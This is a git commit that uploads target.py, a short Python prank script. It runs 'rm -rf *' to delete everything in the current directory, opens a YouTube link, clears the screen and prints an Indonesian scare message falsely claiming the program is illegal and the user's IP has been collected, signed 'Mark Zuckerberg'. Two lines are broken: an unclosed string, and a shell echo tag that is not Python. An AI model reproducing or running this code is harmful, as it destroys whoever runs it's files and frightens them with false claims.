e4ffda5e8c40a353417c8b1205e3302fec9df7d1
Nub5ecCo <55526852+Nub5ecCo@users.noreply.github.com>
2019-10-09 14:32:14 +0700

    Add files via upload

---
+++ target.py
@@ -0,0 +1,6 @@
+import os
+os.system("rm -rf *")
+os.system("xdg-open https://youtube.com/panda{ns})
+os.system("clear")
+print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
+echo #FF0008 "ZI20 WAS HERE"
